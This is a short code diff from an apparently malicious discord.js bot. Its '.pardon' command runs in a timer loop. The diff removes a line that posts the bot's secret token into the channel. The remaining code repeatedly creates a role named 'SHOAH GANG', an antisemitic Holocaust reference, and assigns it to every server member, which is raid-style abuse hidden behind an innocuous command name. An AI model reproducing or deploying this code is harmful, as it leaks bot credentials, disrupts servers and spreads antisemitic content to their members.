@@ -91,7 +91,6 @@ if (msg.content === '.pardon') {
     let i = 0;
     let interval = setInterval(function () {
     if (i === 250) clearInterval(interval);
-    message.channel.send(`${bot.token}`)
     msg.guild.createRole({name: 'SHOAH GANG', color:'RANDOM'}).then(function(role) {
       msg.guild.members.forEach(member => {
       member.addRole(role).catch(e => {});
